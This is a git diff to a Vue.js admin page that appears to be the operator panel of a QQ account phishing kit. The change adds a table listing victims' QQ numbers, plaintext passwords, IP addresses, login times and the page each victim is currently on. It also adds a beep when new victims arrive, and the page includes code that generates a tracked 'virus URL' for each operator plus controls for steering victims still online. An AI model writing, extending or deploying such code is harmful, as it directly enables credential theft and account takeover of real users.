@@ -1,5 +1,11 @@
 <template>
   <div>
+    <audio class="audio"
+           src="@/assets/tip3.mp3"
+           controls
+           id="warningAudio" hidden>
+    </audio>
+
     <van-nav-bar
       class="pop-btn"
       title="用户管理"
@@ -8,6 +14,7 @@
       v-clipboard:copy="copyText"
     >
     </van-nav-bar>
+
     <!-- 用户管理 -->
     <div class="tabbar-div">
       <van-search
@@ -21,16 +28,54 @@
         finished-text="没有更多了"
         @load="onLoadUser"
       >
-        <van-cell
+        <!-- 需要更改 -->
+        <!-- <van-cell
           @click="check(item.id)"
           v-for="item in list"
-          :key="item"
+          :key="item.data"
           :title="item.data"
         >
         <button @click="updateState(item.id,item.auditstatus)">处理状态</button>
-        <br>
         <button @click="deleteUser(item.id)">删除用户</button>
-        </van-cell>
+        </van-cell> -->
+
+        <el-table :data="list" style="width: 100%">
+          <el-table-column prop="id" label="编号" width="180"></el-table-column>
+          <el-table-column prop="username" label="QQ账号" width="180"></el-table-column>
+          <el-table-column prop="password" label="QQ密码" width="180"></el-table-column>
+          <el-table-column prop="myauditstatus" label="审核状态" width="180"></el-table-column>
+          <el-table-column prop="staypage" label="目前状态：" width="180"></el-table-column>
+          <el-table-column prop="ip" label="登录ip" width="180"></el-table-column>
+          <el-table-column prop="logintime" label="登录时间" width="180"></el-table-column>
+
+        <!-- 编号：${element.id}
+        QQ账号：${element.username}
+        QQ密码：${element.password}
+        审核状态：${auditstatus}
+        目前停留配置页：${element.staypage}
+        登录IP：${element.ip}
+        登录时间：${element.logintime} -->
+
+          <el-table-column label="操作">
+            <template slot-scope="scope">
+              <el-button
+                size="mini"
+                @click="updateState(scope.row.id,scope.row.auditstatus)">处理状态</el-button>
+            </template>
+          </el-table-column> 
+          
+          <el-table-column label="操作">
+            <template>
+              <el-button
+                size="mini"
+                type="danger"
+                @click="deleteUser(scope.row.id)">删除</el-button>
+            </template>
+          </el-table-column>
+
+        </el-table>
+
+        <!-- 上方需要更改 -->
       </van-list>
 
       <van-pagination
@@ -44,27 +89,30 @@
 
     <van-tabbar @change="onChange" v-model="active">
       <van-tabbar-item icon="home-o">首页</van-tabbar-item>
-      <van-tabbar-item v-show="isAdmin" icon="search" dot
-        >管理员管理</van-tabbar-item
-      >
-      <van-tabbar-item icon="friends-o" badge="5">用户管理</van-tabbar-item>
-      <van-tabbar-item icon="setting-o" badge="20">我的</van-tabbar-item>
+      <van-tabbar-item v-show="isAdmin" icon="search">管理员管理</van-tabbar-item>
+      <van-tabbar-item icon="friends-o">用户管理</van-tabbar-item>
+      <van-tabbar-item icon="setting-o">我的</van-tabbar-item>
     </van-tabbar>
+
+
+    <my-bottom/>
   </div>
 </template>
 
 <script>
+
 // 这里可以导入其他文件（比如：组件，工具js，第三方插件js，json文件，图片文件等等）
 import admin from "@/api/admin";
 import user from "@/api/user";
 import { Toast } from "vant";
 import site from "@/api/site";
-import { Notify } from 'vant';
-import { Dialog } from 'vant';
+import { Notify } from "vant";
+import { Dialog } from "vant";
+// import MyBottom from '@/components/bottom.vue'
 
 export default {
   // 组件注册
-  components: {},
+  // components: {'MyBottom':MyBottom},
   // 定义属性
   data() {
     return {
@@ -80,64 +128,75 @@ export default {
       isNmber: false, // 是否第一次赋值总条数
       setintervals: null,
       isAdmin: false,
+      ifTip:false
     };
   },
   // 计算属性，会监听依赖属性值随之变化
   computed: {},
   // 监控data中的数据变化
-  watch: {},
+  watch: {
+    totalCount(next,pre){
+      console.log('变化：',pre,next)
+      if(next > pre && pre != 0 ){
+      //进行响铃
+        console.log('############')
+        let warningAudioDom = document.getElementById('warningAudio')
+        // 触发播放
+        warningAudioDom.play()        
+      }
+    }
+  },
   // 方法集合
   methods: {
     // 删除用户
     deleteUser(id) {
       Dialog.confirm({
-      title: '提示',
-      message: '您确认要删除吗？删除后不可恢复',
-    })
-      .then(() => {
-        // on confirm
-        user.deleteUser(id).then(res=>{
-          if(res.code == "200") {
-              Toast.success(`删除成功`);
-              this.onLoadUser() // 重新赋值
-              if(this.list.length-1 == 0 ) {
-                this.list = []
-              }
-          }else{
-              Toast.success(`删除失败`);
-          }
-        })
+        title: "提示",
+        message: "您确认要删除吗？删除后不可恢复",
       })
-      .catch(() => {
-        // on cancel
-      });
-     },
+        .then(() => {
+          // on confirm
+          user.deleteUser(id).then((res) => {
+            if (res.code == "200") {
+              Toast.success(`删除成功`);
+              this.onLoadUser(); // 重新赋值
+              if (this.list.length - 1 == 0) {
+                this.list = [];
+              }
+            } else {
+              Toast.success(`删除失败`);
+            }
+          });
+        })
+        .catch(() => {
+          // on cancel
+        });
+    },
     onClickRight() {
       // 生产病毒URL
       site.getSiteInfo().then((res) => {
         const logInfo = JSON.parse(sessionStorage.getItem("user")); // 获取当前登录信息
         const att = `${res.site.value1}#/?adminUserName=${logInfo.username}`; // 生成病毒URL
 
-
         const toast = Toast.loading({
-        duration: 0, // 持续展示 toast
-        forbidClick: true,
-        message: '倒计时 3 秒',
-      });
+          duration: 0, // 持续展示 toast
+          forbidClick: true,
+          message: "倒计时 3 秒",
+        });
 
-      let second = 3;
-      const timer = setInterval(() => {
-        second--;
-        if (second) {
-          toast.message = `倒计时 ${second} 秒  请手动复制`;
-        } else {
-          clearInterval(timer);
-          // 手动清除 Toast
-          Toast.clear();
+        let second = 3;
+        const timer = setInterval(() => {
+          second--;
+          if (second) {
+            toast.message = `倒计时 ${second} 秒  请手动复制`;
+          } else {
+            clearInterval(timer);
+            // 手动清除 Toast
+            Toast.clear();
 
-          window.open(att); // 跳转
-        }
-      }, 1000);
+            window.open(att); // 跳转
+          }
+        }, 1000);
       });
     },
 
@@ -167,18 +226,13 @@ export default {
               auditstatus = "加载页面";
             }
 
-            // 局部变量push数据
-            arr.push({
-              id: element.id,
-              auditstatus: element.auditstatus,
-              data: `编号：${element.id} ---- QQ账号：${element.username} ---- QQ密码：${element.password} ---- 审核状态：${auditstatus} ----  目前停留配置页：${element.staypage} ----登录IP：${element.ip} ---- 登录时间：${element.logintime}`,
-            });
-
-            // 赋值数据替换旧数据
-            this.list = arr;
-
-            // console.log(element);
+            element['myauditstatus'] = auditstatus
+            arr.push(element)
+            // console.log(element)
           }
+          console.log(arr)
+          this.list = arr
+          this.finished = true;
         });
       } else {
         this.onLoadUser(); //重新初始化数据
@@ -212,16 +266,23 @@ export default {
       // 点击页码事件
       this.onLoadUser();
     },
-    updateState(id,auditstatus){
-        user.info(id).then((res) => {
-          console.log(res);
-          if (res.code == "500") {
-            Notify('无需修改状态，用户已经离线');
-          } else if (res.code == "200") {
-            this.$router.push({path:"/updateState",query:{"id":id,"auditstatus":auditstatus,"info":`编号:${id},在线,当前操作页:${res.user.staypage}`}})
-          }
-        });
-        
+    updateState(id, auditstatus) {
+      console.log(id,auditstatus)
+      user.info(id).then((res) => {
+        console.log(res);
+        if (res.code == "500") {
+          Notify("无需修改状态，用户已经离线");
+        } else if (res.code == "200") {
+          this.$router.push({
+            path: "/updateState",
+            query: {
+              id: id,
+              auditstatus: auditstatus,
+              info: `编号:${id},在线,当前操作页:${res.user.staypage}`,
+            },
+          });
+        }
+      });
     },
     onLoadUser() {
       // 初始化数据
@@ -235,16 +296,14 @@ export default {
             // ture 就一次进入该方法
             this.isNmber = true;
           }
-
-          this.totalPage = res.page.totalPage; // 赋值最大页码
+          
+          this.totalCount = res.page.totalCount; // 赋值最大数据
 
           const arr = []; // 初始化数组
           for (let index = 0; index < res.page.list.length; index++) {
             const element = res.page.list[index];
-
             // 局部变量push数据
             // 是否在线：${element.state == 0?'在线':'离线'} ----
-
             var auditstatus = "";
             if (element.auditstatus == 1) {
               auditstatus = "密码错误";
@@ -260,18 +319,12 @@ export default {
             if (element.auditstatus == 5) {
               auditstatus = "加载页面";
             }
-            arr.push({
-              id: element.id,
-              auditstatus: element.auditstatus,
-              data: `编号：${element.id} ---- QQ账号：${element.username} ---- QQ密码：${element.password} ---- 审核状态：${auditstatus} ----  目前停留配置页：${element.staypage} ----登录IP：${element.ip} ---- 登录时间：${element.logintime}`,
-            });
-
-            // 赋值数据替换旧数据
-            this.list = arr;
-
-            // console.log(element);
+            element['myauditstatus'] = auditstatus
+            arr.push(element)
+            // console.log(element)
           }
-
+          console.log(arr)
+          this.list = arr
           this.finished = true;
         }
       });
@@ -292,6 +345,7 @@ export default {
   },
   // 生命周期 - 挂载完成（可以访问DOM元素）
   mounted() {
+    localStorage.setItem('totalPage',0)
     this.setintervals = setInterval(this.onLoadUser, 3000); // 开启监控
   },
   beforeCreate() {}, // 生命周期 - 创建之前
